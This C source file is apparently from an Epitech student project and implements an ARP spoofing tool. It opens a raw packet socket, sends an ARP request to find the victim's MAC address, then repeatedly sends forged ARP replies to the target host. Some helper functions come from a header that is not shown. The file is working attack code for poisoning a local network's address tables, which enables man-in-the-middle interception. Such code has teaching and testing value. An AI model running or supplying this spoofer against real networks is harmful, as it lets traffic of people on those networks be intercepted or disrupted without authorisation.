/*
** EPITECH PROJECT, 2018
** OOP_indie_studio_2018
** File description:
** do_arp.c
*/

#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include "myarpspoof.h"

static void fit_buffer(unsigned char *buffer, struct ether_header *header,
    struct ether_arp *arp)
{
    unsigned int i = 0;

    for (unsigned j = 0; j < sizeof(struct ether_header); j++) {
        buffer[i] = ((unsigned char *)header)[j];
        i++;
    }
    for (unsigned j = 0; j < sizeof(struct ether_arp); j++) {
        buffer[i] = ((unsigned char *)arp)[j];
        i++;
    }
}

int get_spoof_mac(args_t *args, int socket_fd, struct ether_header *header,
    struct ether_arp *arp)
{
    unsigned char buffer[42];

    fit_buffer(buffer, header, arp);
    if (sendto(socket_fd, buffer, 42, 0, (struct sockaddr *)&(args->sock),
        sizeof(args->sock)) != 42) {
        dprintf(2, "failed to send socket %s\n", strerror(errno));
        return (84);
    }
    if (recv(socket_fd, buffer, 42, 0) != 42) {
        dprintf(2, "failed to get response %s\n", strerror(errno));
        return (84);
    }
    for (unsigned int i = 6; i < 12; i++)
        args->target_mac[i - 6] = buffer[i];
    dprintf(1, "Found victim’s MAC address: '");
    for (unsigned int i = 0; i < 6; i++)
        dprintf(1, "%02x%c", args->target_mac[i], i < 5 ? ':' : '\'');
    dprintf(1, "\n");
    return (0);
}

int loop_spoof(args_t *args, int socket_fd, struct ether_header *header,
    struct ether_arp *arp)
{
    unsigned char buffer[42];

    for (int i = 0; i < 6; i++) {
        header->ether_dhost[i] = args->target_mac[i];
        arp->arp_tha[i] = args->target_mac[i];
    }
    arp->ea_hdr.ar_op = htons(ARPOP_REPLY);
    fit_buffer(buffer, header, arp);
    for (int i = 0; i < SPOOF_LOOP; i++) {
        if (sendto(socket_fd, buffer, 42, 0, (struct sockaddr *)&(args->sock),
            sizeof(args->sock)) != 42) {
            dprintf(2, "failed to spoof %s\n", strerror(errno));
            return (84);
        }
        dprintf(1, "Spoofed packet sent to '%s'\n", args->target_ip);
        sleep(1);
    }
    return (0);
}

int do_arp(args_t *args)
{
    int ret = 84;
    int socket_fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    struct ether_header *header = get_ether_header(args);
    struct ether_arp *arp = get_ether_arp(args, TRUE);

    args->sock.sll_ifindex = args->index;
    if (socket_fd != -1 && header && arp)
        ret = get_spoof_mac(args, socket_fd, header, arp);
    if (ret == 0)
        ret = loop_spoof(args, socket_fd, header, arp);
    if (socket_fd != -1)
        close(socket_fd);
    if (header)
        free(header);
    if (arp)
        free(arp);
    return (ret);
}